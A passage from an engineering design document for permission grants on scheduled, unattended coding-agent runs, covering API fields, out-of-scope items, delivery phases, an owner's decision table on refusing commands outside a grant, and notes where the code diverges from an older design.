- `schedule_create` and `schedule_update` take `grant: { commands, tools, paths }`; `schedule_update` also takes
  `grant: { add, remove }`. Adding is a card; removing applies at once. A run's `schedule_update` on its own
  schedule may add (a card) and may not remove.
- `schedule_get` returns the entries, their use, the declined ones, and each run's refused commands, so any session
  can answer "why did last night's run not finish?".
- `schedule_run_report` is unchanged. A run says what it could not do in its `summary`; the server files the card
  from its own record, so a run that crashed is still accounted for.
- Operation catalogue and contract: a minor bump of the Agent Contract (new fields, a new `failureReason`, two
  `heldReason`s, the error codes of §4–§6).

## 12. Out of scope for v1

- Argument patterns, regular expressions, per-entry working directories.
- A grant for ordinary sessions, tasks or projects. A workspace-level "unattended profile".
- Entries that expire by themselves.
- Path enforcement during the run, and a path allowlist for `OPEN_PR`.
- A deploy level (schedule design §10), and a grant on OpenCode.
- Pinning schedules to a dedicated runner, which would bound secrets better than any list (schedule design §10
  leaves pinning out).

## 13. Delivery

| Phase | Scope | Proven by |
| --- | --- | --- |
| P0 | Boards for §5.1, §5.4, §8, owner approval. Measure, on the real CLIs: a compound command's shape at Claude's prompt; Codex `commandActions`; Kimi's and Cursor's shell asks in `acceptEdits`; Antigravity on a signed-in host | the record, appended to `scheduled-tasks-engine-modes.md` |
| P1 server | migration (`schedule_grant_entry`, the columns of §4); the matcher with its fuzz spec; envelope part `GRANT`; the door (§6.2, §6.3); the request filed after a run; `OUTSIDE_GRANT`; run block; `schedule_*` fields; `CHECK_ONLY` rows migrated; `LEGACY` kept | pg specs for each rule of §4–§6; the measured `git fetch` case replayed end to end with no card |
| P2 runner and landing | `scheduled-run-grant/v1` (Claude settings sources, Codex `commandActions`); `schedule-land-paths/v1` and the landing refusal; attended runs (§6.4) | Go tests pinning the argv as `schedule_check_only_test.go` does; a `LAND` run with a diff outside its paths refused on a real runner |
| P3 clients and conversion | create and widen cards, inspector, run row, landing refusal on iOS, then web, macOS, Android; the conversion card of §9; `LEGACY` removed when empty | per-client tests; the copy guard (`copyLanguage.test.ts`) |
| P4 hardening | a sandbox under the grant where the engine has one: Codex `workspaceWrite` with the worktree's git directory writable and `networkAccess` set by whether the grant holds a network entry (`codex_auto_policy.go:30-36`, `:47-55`); Claude Code's and Cursor's own sandboxes after measurement | a live test per engine, as `TestCodexReadOnlySandboxNetworkLive` |

## 14. Decisions

The owner chose A on all nine (G1–G9) on 2026-11-18. The table keeps B for the record.

| | Question | A (recommended) | B |
| --- | --- | --- | --- |
| G1 | A command outside the grant, nobody present | Refuse at once, the run goes on; one card after the run; a cap of 5 refusals fails it (§6.3) | Ask and wait, as today, with a shorter timeout (15 minutes), then refuse. Keeps a chance of a same-day finish; keeps the stalled slot and the push that needs an answer |
| G2 | A run the owner starts by pressing Run now | Attended: it asks live, and **Allow for this schedule** writes the grant (§6.4) | Every run refuses; the grant only grows through the card after a run. One behaviour instead of two, and a slower first day |
| G3 | A `LAND` run that was refused a command | Lands nothing; fails `OUTSIDE_GRANT` with **Allow and run again** (§6.3) | Lands when the run reported success: the merge check is the judge. Fewer failed runs; a run whose tests were refused can reach `main` |
| G4 | Paths on a `LAND` schedule | Required at creation; `**` must be asked for in those words; paths that change what runs need naming (§4.3) | Optional: no entry means any path. Less to press; the companion guard is then off by default |
| G5 | Workspace "Always allow" rules in a scheduled run | Not read: a run carries only its own grant (§6.1) | Read as well. Existing clicks keep working; failure modes 2 and 3 stay, and the card no longer says everything the run may do |
| G6 | Who matches | The server's door, for every engine (§6.2) | Hand Claude Code the entries as `--allowedTools` and match the rest at the door. No round trip on Claude; two matchers that can disagree, and Claude's reads characters of a command as pattern syntax, which is why a check's commands are not exported today |
| G7 | Reading commands in a pipe (`head`, `tail`, `grep`, `jq`) | Entries like any other: the agent lists them, the card folds them ("and 4 reading commands") | A built-in set the door always covers. Fewer refusals on day one; the server then judges a command safe, which the rule matcher was written not to do (`permission-rules.ts:249-252`) |
| G8 | Existing `OPEN_PR` and `LAND` schedules | Stay as they are until the owner presses the conversion card (§9) | Convert at once with the proposed grant. Unattended from day one; a grant nobody pressed |
| G9 | Network in v1 | Named on the card; no blocking. The sandbox comes in P4 | No shell network unless the grant holds a network entry, enforced by a sandbox, before P1 ships on any engine without one. Stronger; Kimi, Antigravity and (until measured) Claude Code could not run editing schedules |

Kept without asking, because the owner already ruled: a `CHECK_ONLY` schedule holds `EXACT` commands only
(2026-11-16, commit `180f833e5`).

## 15. What the code says that the schedule design does not

Found while reading; none is changed here.

1. Schedule design §6.2 (lines 340–345, 386–390) says a check carries prefix rules such as `Bash(npm test:*)` as
   engine allow rules. The code carries none and compares the exact command at the door
   (`schedule-access.ts:256-259`, `:288-293`); the doc predates commit `180f833e5`.
2. Schedule design §3 and §4 still name two access levels (lines 103, 169), and so does
   `condition-triggers-design.md:49`. `LAND` is in §6.2 only.
3. Answering **Always allow** on a check's card marks an identical rule an interactive session wrote as
   `fromScheduleRun` (`sessions.service.ts:10061-10069`), after which `dispatchAllowedTools` stops handing it to
   every session (`permission-rules.ts:120`). A person's own rule can stop working because a schedule's card was
   answered.
4. Failure modes 7 and 8 of §1.1 *(both inferred)*: Codex's wrapped commands are covered by no workspace rule, and
   the level's denied commands are enforced as denials only on Claude Code.
5. DeepSeek Harness cards are never answered from workspace rules (`permission-rules.ts:149-154`), and its
   `OPEN_PR` mode is `default`, which asks before each write (`permissionSemantics.ts:256-266`): an editing schedule
   there stops at its first edit. Not measured (not installed, `scheduled-tasks-engine-modes.md:313`).
6. `schedule-start-check.ts:10` says the repository check is for `OPEN_PR`; the code applies it to `LAND` too
   (`:108-110`).
7. `OPEN_PR_DISALLOWED_TOOLS` holds `mcp__orbit__integration_*` and four `git push` patterns
   (`schedule-access.ts:323`, `:327-330`) that the list in schedule design §6.2 (lines 323–326) does not name.
